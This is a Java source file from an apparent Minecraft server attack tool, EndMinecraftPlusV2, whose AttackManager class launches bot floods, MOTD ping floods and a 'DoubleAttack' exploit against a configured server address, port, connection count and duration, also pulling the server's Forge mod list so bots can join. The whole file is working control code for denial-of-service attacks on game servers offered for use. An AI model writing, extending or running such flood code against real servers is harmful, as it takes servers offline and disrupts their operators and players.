package cn.serendipityr.EndMinecraftPlusV2.VersionControl;

import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils.*;
import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForge;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForgeMOTD;
import cn.serendipityr.EndMinecraftPlusV2.Tools.ConfigUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.DataUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.LogUtil;
import cn.serendipityr.EndMinecraftPlusV2.Tools.OtherUtils;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class AttackManager {
    public static Boolean isDoubleAttack = false;
    public static void doAttack() {
        LogUtil.emptyLog();
        DataUtil.loadData();

        switch (ConfigUtil.AttackMethod) {
            case 1:
                // BotAttack
                Map<String, String> modList = new HashMap<>();

                if (ProtocolLibs.highVersion) {
                    LogUtil.doLog(0, "当前选定协议库版本不支持获取Forge Mods。", "BotAttack");

                    if (ProtocolLibs.adaptAfter754) {
                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewBotAttack botAttack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewBotAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                        botAttack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, modList);
                        botAttack.start();
                    } else {
                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.BotAttack botAttack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.BotAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                        botAttack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, modList);
                        botAttack.start();
                    }
                } else {
                    if (!MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "BotAttack");
                        modList = new MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(modList.keySet().toArray()), "BotAttack");
                    }

                    BotAttack botAttack = new BotAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    botAttack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, modList);
                    botAttack.start();
                }

                break;
            case 2:
                // MotdAttack
                IAttack motdAttack = new MotdAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                motdAttack.start();
                break;
            case 3:
                // MotdAttackP
                IAttack motdAttackP = new MotdAttackP(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                motdAttackP.start();
                break;
            case 4:
                // DoubleAttack
                Map<String, String> doubleModList = new HashMap<>();
                isDoubleAttack = true;

                if (ProtocolLibs.highVersion) {
                    LogUtil.doLog(0, "当前选定协议库版本不支持获取Forge Mods。", "DoubleAttack");

                    if (ProtocolLibs.adaptAfter754) {
                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewDoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.NewDoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                        attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
                        attack.setUsername(ConfigUtil.DoubleExploitPlayer);
                        attack.start();
                    } else {
                        cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack attack = new cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.AttackUtils.DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                        attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
                        attack.setUsername(ConfigUtil.DoubleExploitPlayer);
                        attack.start();
                    }
                } else {
                    if (!MCForge.isAfterVersion1_13()) {
                        LogUtil.doLog(0, "正在获取服务器上的Forge Mods...", "DoubleAttack");
                        doubleModList = new MCForgeMOTD().pingGetModsList(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, MCForge.getProtocolVersion());
                        LogUtil.doLog(0, "Mods: " + Arrays.toString(doubleModList.keySet().toArray()), "DoubleAttack");
                    }

                    DoubleAttack attack = new DoubleAttack(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, ConfigUtil.AttackTime, ConfigUtil.MaxConnections, ConfigUtil.ConnectDelay);
                    attack.setBotConfig(ConfigUtil.AntiAttackMode, ConfigUtil.TabAttack, doubleModList);
                    attack.setUsername(ConfigUtil.DoubleExploitPlayer);
                    attack.start();
                }

                break;
            default:
                LogUtil.doLog(1, "攻击类型错误，停止运行。", null);
                EndMinecraftPlusV2.Exit();
        }
    }

    public static String getRandomUser() {
        if (isDoubleAttack) {
            return ConfigUtil.DoubleExploitPlayer + "@12345678Aa!";
        }

        return DataUtil.botRegPasswords.get(new Random().nextInt(DataUtil.botRegPasswords.size()));
    }
}
